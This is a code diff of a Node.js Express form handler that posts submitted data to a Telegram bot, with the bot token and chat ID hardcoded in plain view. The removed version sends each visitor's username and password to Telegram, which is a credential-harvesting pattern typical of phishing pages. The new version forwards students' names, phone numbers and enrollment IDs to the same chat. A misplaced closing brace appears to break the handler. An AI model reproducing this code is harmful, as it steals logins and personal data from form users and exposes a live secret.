@@ -8,22 +8,30 @@ const TELEGRAM_BOT_TOKEN = '8957531455:AAH5F5NVTBvUb4cU721SVDu-VXGfZG3ME-Y';
 const TELEGRAM_CHAT_ID = '7611064372';
 
 app.post('/submit', (req, res) => {
-    const { username, password } = req.body;
-    
-    // Telegram ka URL jahan data bhejna hai
- const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=Username: ${username} Password: ${password}`;
+    const { name, phone, group, section, attendance, branch, enrollment } = req.body;
+
+    const message = `🎓 *New Student Attendance*:\n\n` +
+                    `👤 *Name*: ${name}\n` +
+                    `📞 *Phone*: ${phone}\n` +
+                    `👥 *Group*: ${group}\n` +
+                    `🏫 *Section*: ${section}\n` +
+                    `📋 *Attendance*: ${attendance}\n` +
+                    `🏛️ *Branch*: ${branch}\n` +
+                    `🆔 *Enrollment*: ${enrollment}`;
+
+    const textParam = encodeURIComponent(message);
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textParam}&parse_mode=Markdown`;
 
     https.get(url, (telegramRes) => {
         let data = '';
-        telegramRes.on('data', (chunk) => {
-            data += chunk;
-        });
+        telegramRes.on('data', (chunk) => { data += chunk; });
         telegramRes.on('end', () => {
             console.log("Telegram Response:", data);
         });
     }).on('error', (err) => {
         console.log("Error:", err.message);
     });
+});
 
    res.send(`
     <!DOCTYPE html>
